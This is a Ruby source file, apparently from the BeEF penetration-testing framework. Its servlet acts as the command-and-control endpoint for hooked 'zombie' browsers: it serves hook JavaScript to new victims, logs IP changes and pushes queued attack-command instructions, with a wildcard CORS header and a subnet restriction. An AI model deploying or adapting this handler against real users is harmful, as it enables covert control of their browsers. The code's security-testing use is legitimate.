module BeEF
module Core
module Handlers
  
  #
  # This class handles connections from zombies to the framework.
  #
  class HookedBrowsers < WEBrick::HTTPServlet::AbstractServlet
    
    include BeEF::Core::Handlers::Modules::BeEFJS
    include BeEF::Core::Handlers::Modules::Command
    
    attr_reader :guard
    
    def initialize(config)
      @guard = Mutex.new
    end
    
    #
    # This method processes the http requests sent by a zombie to the framework.
    # It will update the database to add or update the current zombie and deploy
    # some command modules or plugins.
    #
    def do_GET(request, response)
      @body = ''
      @params = request.query
      @request = request
      @response = response
      config = BeEF::Core::Configuration.instance
      
      # check source ip address of browser
      permitted_hooking_subnet = config.get('beef.restrictions.permitted_hooking_subnet')
      target_network = IPAddr.new(permitted_hooking_subnet)
      if not target_network.include?(request.peeraddr[3].to_s)
        BeEF::Core::Logger.instance.register('Target Range', "Attempted hook from out of target range browser (#{request.peeraddr[3]}) rejected.")
        @response.set_error(nil)
        return
      end

      # get zombie if already hooked the framework
      hook_session_id = request.get_hook_session_id()
      hooked_browser = BeEF::Core::Models::HookedBrowser.first(:session => hook_session_id) if not hook_session_id.nil?
      
      if not hooked_browser # is a new browser so return instructions to set up the hook
        
        # generate the instructions to hook the browser
        host_name = @request.host # get the host from the HOST attribute in the HTTP header
        raise WEBrick::HTTPStatus::BadRequest, "Invalid host name" if not BeEF::Filters.is_valid_hostname?(host_name)
        build_beefjs!(host_name)
      
      else # is a known browseer so send instructions 
      
        # record the last poll from the browser
        hooked_browser.lastseen = Time.new.to_i
        
        # Check for a change in zombie IP and log an event
        if hooked_browser.ip != @request.peeraddr[3].to_s
          BeEF::Core::Logger.instance.register('Zombie',"IP address has changed from #{hooked_browser.ip} to #{@request.peeraddr[3].to_s}","#{hooked_browser.id}")
          hooked_browser.ip = @request.peeraddr[3].to_s
        end
      
        hooked_browser.count!
        hooked_browser.save
        
        # add all availible command module instructions to the response
        zombie_commands = BeEF::Core::Models::Command.all(:hooked_browser_id => hooked_browser.id, :instructions_sent => false)
        zombie_commands.each{|command| add_command_instructions(command, hooked_browser)}

        #
        # We dynamically get the list of all browser hook handler using the API and register them
        #
        BeEF::API.fire(BeEF::API::Server::Hook, 'pre_hook_send', hooked_browser, @body, @params, @request, @response)
      end

      # set response headers and body
      response.set_no_cache
      response.header['Content-Type'] = 'text/javascript' 
      response.header['Access-Control-Allow-Origin'] = '*'
      response.header['Access-Control-Allow-Methods'] = 'POST, GET'
      response.body = @body
      
    end
      
    alias do_POST do_GET
    
    private
    
    # Object representing the HTTP request
    @request
    
    # Object representing the HTTP response
    @response
    
    # A string containing the list of BeEF components active in the hooked browser
    @beef_js_cmps
    
  end
  
end
end
end
